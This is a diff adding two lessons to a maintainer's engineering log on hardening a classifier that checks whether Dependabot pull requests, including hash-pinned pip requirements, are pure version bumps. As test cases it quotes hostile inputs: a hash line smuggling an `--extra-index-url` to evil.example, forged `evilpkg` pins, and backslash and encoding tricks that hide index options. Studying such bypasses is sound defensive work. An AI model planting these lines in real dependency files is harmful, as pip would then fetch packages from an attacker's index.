@@ -3405,3 +3405,128 @@ survived, because the segment regex already refuses a leading `.`. The clause
 was removed rather than given a test of its own, and the regex was mutated
 instead, which the suite caught. The tag-object loop's mutant runs under a
 60-second cap that the test asserts it did not hit.
+
+## 118. A pip bump was refused for being a pip bump
+
+sysknife added a pip ecosystem to its Dependabot config for `tools/ci-python` on
+2026-10-29. The first pull request it opened, #735, moved PyYAML from 6.0.2 to
+6.0.3: one pin line and 126 hash lines in a requirements file CI installs with
+`pip install --require-hashes`. `verify-deps` refused it with
+`tools/ci-python/requirements.txt is not dependency metadata`. The classifier
+knew Cargo, npm, workflows and Dockerfiles, so a hash-pinned requirements file,
+a lockfile in everything but name, sent the bump back to the same corner lesson
+101 found for base images: a hand receipt, which an unattended run may not
+write, or `gh pr merge --admin`.
+
+I checked #735 by hand before changing anything. The 73 hashes it added were
+exactly the 73 file digests PyPI publishes for PyYAML 6.0.3, none yanked, and
+the lines for pathspec and yamllint were byte-identical to main. That check is
+mechanical, so the gate now runs it.
+
+**Guard:** a `pip-requirements` arm whose grammar is an allowlist. A changed line
+is a `name==version` pin (an environment marker allowed, in a character set with
+no `@`, `/` or `:`; extras refused, because `name[x]` installs packages the line
+does not name), an indented `--hash=sha256:<64 hex>` line, a comment, or blank.
+Everything pip can read as a source (`--index-url`, `--extra-index-url`, `-f`,
+`-e`, `-r`, `name @ url`) matches nothing and is refused on either side of the
+diff: removing a private index is a new place to download from as much as
+adding a public one. pip splits a requirement line on spaces and reads
+everything from the first token starting with `-` as options, inside quotes or
+not (`req_file.break_args_options`), and the marker's character set holds `-`,
+`=` and quotes. The first version let
+`PyYAML==6.0.3 ; python_version >= "3" --config-settings=x=y` through as a pin;
+a security review of the pushed branch caught it, and a requirement line with
+such a token is now refused. Each added hash must hang off an added requirement through
+pip's trailing-backslash continuation, so a hash swapped under an unchanged pin,
+or one after a line that does not continue, belongs to no release and is
+refused. A requirement that arrives without hashes in a file that had them is
+refused before pip would refuse it in CI.
+
+`scripts/verify_pypi_release.py` asks `pypi.org/pypi/<name>/<version>/json` and
+refuses a yanked release, a release with no files (an empty set every hash
+"matches" by not being checked), and any hash that is not one of the release's
+files. Name and version must be plain before they reach the URL, for the reason
+lesson 117 gives. `verify-deps` counts the packages the classifier declared
+against the ones it verified, as it does for pins and images.
+
+Each refusal test asserts its reason text; the checker runs offline
+against a `file://` tree through `MAINTAINER_PYPI_URL`. 30 mutants, one per
+guard, all killed, run against a slice of the suite with each file restored from a
+pristine copy and its hash checked.
+
+## 119. The classifier split lines where git does not, and two reviews found the ways through
+
+A Sonnet review of the pip arm, briefed to break it, came back with twenty
+hostile diffs: seventeen the classifier called pure bumps, one that stalled it
+past 45 seconds, and two slow ones it still refused. Three causes:
+
+- `parse()` split the diff with `str.splitlines()`, which breaks at form feed,
+  vertical tab, `\x1c`-`\x1e`, NEL, U+2028, U+2029 and a lone CR. git ends a
+  diff line at newline only, and `parse()` keeps only fragments that start with
+  `+` or `-`, so a fragment after one of those characters vanished from the
+  verdict while pip, which splits the same way Python does, installed it:
+  `+    --hash=...\x0c --extra-index-url https://evil.example/simple` passed and
+  pip's own parser read the extra index. YAML treats NEL and U+2028 as line
+  breaks too, so the workflow arm had the same blind spot.
+- Inside a hunk, a removed line `-- --index-url x` prints as `--- --index-url x`,
+  and `parse()` skipped every line starting `--- ` as a file header. Hunk lines
+  are now counted from the `@@` header, so a header can only appear between
+  hunks.
+- The pip arm checked each line's grammar and never the pair of lines a bump
+  is: a removed pin and an added pin of the same package at a higher version.
+  A swap, a removal, a deletion, a marker flip, a downgrade and a pin moved
+  without its hashes all kept the grammar. A hash under another package's
+  unchanged pin, in a later hunk, was credited to the last added package,
+  because context lines are dropped and nothing marked where a hunk began.
+
+The marker regex also backtracked: `a==1 ;` and 1500 spaces ran past 30
+seconds. The parser now fullmatches one character class at a time, caps a line
+at 1000 characters, and `verify-deps` puts a timeout around the classifier.
+
+One fix of mine was wrong in its reason. I read stdin as bytes "because
+text-mode stdin turns a lone CR into a newline"; on Linux CPython opens stdin
+with `newline="\n"`, so it does not, and the mutant that went back to text mode
+survived. What the bytes read does buy is strict UTF-8 whatever the locale,
+and that now has its own test.
+
+**Guard:** the line-break refusal, hunk counting, rename/delete/empty-file
+refusals, UTF-8 decoding, the hunk sentinel, the pairing checks and the line cap,
+each with a test built from the review's input, and a mutant per guard (30
+in all, every one killed). Before merging, the new parser ran over the 25 most
+recent merged Dependabot pull requests on sysknife: same verdict, same line,
+pin and image counts for all 25.
+
+A third finding came after that commit, from an automated security review:
+`verify-deps` classified `gh pr diff --patch`, and the parser skipped the
+commit message between two patches. A message is text the author writes, and
+it can hold a whole forged `diff --git` and hunk. A fake removed
+`evilpkg==0.1` in a message, before a real patch adding `evilpkg==1.0`, makes a
+new package read as an upgrade. No rule for where a message ends is safe,
+because a message may itself hold a `---` line. The classifier now refuses mbox
+input, and `verify-deps`, `maintainer deps` and `maintainer screen` ask for the
+net diff. The same 25 Dependabot pull requests, read as net diffs, classify
+exactly as they did from `--patch` before.
+
+A second review, briefed the same way against the fixed parser, found the rest
+of the shape. Three pip families survived any diff rule, because pip reads lines
+the diff does not show: a trailing backslash on the last added hash line joins
+the next unchanged line, so an `--index-url` below it disappears from pip's
+reading; a `# coding: latin-1` cookie on line 1 re-decodes bytes `c5 85` as NEL;
+and a pin can lose its backslash while its old hash lines stay as context. So
+`verify-deps` now reads the whole file at the merge base and at the head with
+pip's own line joining, refuses anything outside printable ASCII, a cookie, a
+BOM and any option line, and requires the moved pins to be exactly the diff's.
+
+The same review found the other arms had never asked whether a bump still names
+the same thing: a workflow pin repointed at another owner's action, a new
+`uses:` step, a `package.json` tarball URL or `github:` spec, a rewritten script
+under the same key, a `resolved` URL Node reads as another host, a `Cargo.toml`
+git URL, and a renamed Dockerfile stage all classified as bumps, in v0.9.0 as
+shipped. `CARGO_LOCK_OK` held `""`, and every string starts with `""`, so the
+Cargo.lock line check passed everything. Each now has a pairing or a grammar,
+a test from the review's own input, and a mutant.
+
+**Guard, for the whole class:** a bump names the same things before and after,
+and only versions and digests move. Every arm now states that as a comparison
+between the removed and the added side, not as a grammar for one line.
+
